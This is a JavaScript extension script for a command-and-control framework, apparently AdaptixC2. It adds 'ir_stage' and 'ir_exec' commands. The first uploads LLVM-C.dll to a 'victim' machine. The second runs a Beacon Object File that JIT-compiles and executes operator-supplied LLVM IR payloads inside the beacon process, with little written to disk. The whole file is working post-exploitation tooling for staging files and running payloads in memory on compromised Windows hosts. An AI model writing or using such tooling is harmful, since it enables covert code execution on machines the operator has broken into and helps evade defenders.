var metadata = {
    name: "illi",
    description: "In-process LLVM IR execution — JIT-compile .ll/.bc inside the beacon via ORC JIT BOF"
};

// ─── ir_stage ─────────────────────────────────────────────────────────────────
//
// Upload LLVM-C.dll from the operator machine to the victim.
// Run once per victim before any ir_exec call.
//
// Usage:
//   ir_stage /opt/illi/LLVM-C.dll
//   ir_stage /opt/illi/LLVM-C.dll "C:\Users\Public\LLVM-C.dll"

var cmd_ir_stage = ax.create_command(
    "ir_stage",
    "Upload LLVM-C.dll to the victim (run once per host, then use ir_exec)",
    "ir_stage /opt/illi/LLVM-C.dll"
);
cmd_ir_stage.addArgString("local_dll",  "LOCAL path to LLVM-C.dll on the OPERATOR machine", "");
cmd_ir_stage.addArgString("victim_dll", "Destination path on victim", "C:\\Windows\\Temp\\LLVM-C.dll");

cmd_ir_stage.setPreHook(function(id, cmdline, parsed_json) {
    var local_dll  = parsed_json["local_dll"];
    var victim_dll = parsed_json["victim_dll"] || "C:\\Windows\\Temp\\LLVM-C.dll";
    if (!local_dll || local_dll.length === 0) {
        throw new Error("ir_stage: local_dll is required — path to LLVM-C.dll on the OPERATOR machine");
    }
    ax.execute_alias(id, cmdline,
        `upload "${local_dll}" "${victim_dll}"`,
        "Task: stage LLVM-C.dll to victim"
    );
});

// ─── ir_exec ──────────────────────────────────────────────────────────────────
//
// JIT-compile and run LLVM IR inside the beacon process.
// IR bytes travel inside the BOF args — nothing written to victim disk beyond
// LLVM-C.dll already staged by ir_stage.
//
// Positional arg order:
//   1. ir_file   — .ll or .bc file on the OPERATOR machine
//   2. fn_name   — IR entry function (default: main)
//   3. load_libs — comma-separated extra DLLs to LoadLibraryA before JIT
//                  (same as lli.exe --load=user32.dll)
//   4. ir_args   — space-separated args to pass to IR main (default: "")
//   5. dll_path  — path to LLVM-C.dll on the VICTIM
//   --async      — bool flag, return immediately (use when IR spawns threads)
//
// Usage:
//   ir_exec /opt/payloads/final.ll
//   ir_exec /opt/payloads/final.ll nax_main
//   ir_exec /opt/payloads/final.ll main user32.dll,ole32.dll
//   ir_exec /opt/payloads/final.ll main user32.dll "arg1 arg2"
//   ir_exec /opt/payloads/final.ll main user32.dll "arg1 arg2" C:\Windows\Temp\LLVM-C.dll --async

var cmd_ir_exec = ax.create_command(
    "ir_exec",
    "JIT-compile and run LLVM IR inside the beacon (run ir_stage first to upload LLVM-C.dll)",
    "ir_exec /opt/payloads/final.ll"
);
cmd_ir_exec.addArgFile("ir_file",    true,  "LOCAL .ll or .bc file on the OPERATOR machine");
cmd_ir_exec.addArgString("fn_name",         "IR entry function to call (default: main)", "main");
cmd_ir_exec.addArgString("load_libs",       "Comma-separated DLLs to LoadLibraryA before JIT (e.g. user32.dll,ole32.dll)", "");
cmd_ir_exec.addArgString("ir_args",         "Space-separated args to pass to IR main (e.g. \"arg1 arg2\")", "");
cmd_ir_exec.addArgString("dll_path",        "Path to LLVM-C.dll on the VICTIM", "C:\\Windows\\Temp\\LLVM-C.dll");
cmd_ir_exec.addArgBool("--async",           "Async BOF — return immediately (use when IR spawns threads)");

cmd_ir_exec.setPreHook(function(id, cmdline, parsed_json) {
    var ir_bytes  = parsed_json["ir_file"];
    var fn_name   = parsed_json["fn_name"]   || "main";
    var load_libs = parsed_json["load_libs"] || "";
    var ir_args   = parsed_json["ir_args"]   || "";
    var dll_path  = parsed_json["dll_path"]  || "C:\\Windows\\Temp\\LLVM-C.dll";
    var async_arg = parsed_json["--async"]   ? "-a " : "";

    if (!ir_bytes || ir_bytes.length === 0) {
        throw new Error("ir_exec: IR file not found on the OPERATOR machine.");
    }

    // BOF arg order must match go() BeaconDataExtract calls in illi_orc_bof.c:
    //   [0] dllPath  — cstr  (victim-side path to LLVM-C.dll)
    //   [1] irBytes  — bytes (raw .ll text or .bc bitcode)
    //   [2] fnName   — cstr  (entry function name)
    //   [3] loadLibs — cstr  (comma-separated extra DLLs, "" = none)
    //   [4] irArgs   — cstr  (space-separated args to IR main, "" = none)
    var bof_params = ax.bof_pack("cstr,bytes,cstr,cstr,cstr",
        [dll_path, ir_bytes, fn_name, load_libs, ir_args]);
    var bof_path   = ax.script_dir() + "illi_orc_bof." + ax.arch(id) + ".o";

    var load_note = load_libs ? `  load=[${load_libs}]` : "";
    var args_note = ir_args   ? `  args="${ir_args}"`   : "";
    ax.execute_alias(id, cmdline,
        `execute bof ${async_arg}"${bof_path}" ${bof_params}`,
        `Task: JIT-execute LLVM IR → ${fn_name}()  [${ir_bytes.length} bytes]${load_note}${args_note}`
    );
});

// ─── register ─────────────────────────────────────────────────────────────────

var group_illi = ax.create_commands_group(
    "illi - LLVM IR Execution",
    [cmd_ir_stage, cmd_ir_exec]
);

ax.register_commands_group(group_illi, ["beacon"], ["windows"], []);
